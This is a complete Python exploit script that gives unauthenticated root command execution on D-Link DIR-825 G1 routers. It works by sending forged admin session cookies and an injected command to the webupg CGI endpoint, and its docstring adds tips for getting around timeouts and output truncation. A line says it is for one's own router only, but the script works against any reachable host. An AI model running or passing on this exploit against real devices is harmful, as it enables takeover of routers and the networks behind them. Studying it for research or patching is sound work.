#!/usr/bin/env python3
"""Root command execution on stock DIR-825 G1 firmware 7.xx via the webupg
auth-bypass + command injection (D-Link advisory SAP10294; public PoC by
KeenSight Lab / t0ptop). FOR USE ON YOUR OWN ROUTER ONLY.

Usage:
    python3 rce_shell.py "cat /proc/mtd"

Quirks discovered the hard way:
  - spaces must be %20 (the whole command is percent-encoded)
  - the CGI kills long-running commands -> background them and poll flag files
  - large outputs get truncated -> pipe through `openssl base64` and strip
    the openssl WARNING lines locally
  - the webupg module jams permanently ("Init webupg module error") after
    standalone /usr/bin/upgrader runs; only a reboot clears it
"""
import sys, time, urllib.parse, urllib.request


def run(cmd, host="192.168.29.2", timeout=40):
    data = "name=shell&key=twmode&cmd=" + urllib.parse.quote(cmd, safe="")
    req = urllib.request.Request(f"http://{host}/cgi-bin/webupg", data=data.encode(), headers={
        "Referer": f"http://{host}/autoupgrade.asp",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0",
        "Cookie": "sessionid=ae3aa37; auth=ok; language=en_us; sys_UserName=admin",
        "Connection": "close"})
    return urllib.request.urlopen(req, timeout=timeout).read().decode("utf-8", "replace")


if __name__ == "__main__":
    for cmd in sys.argv[1:]:
        print(run(cmd))
        time.sleep(1.5)  # the CGI needs a beat between calls
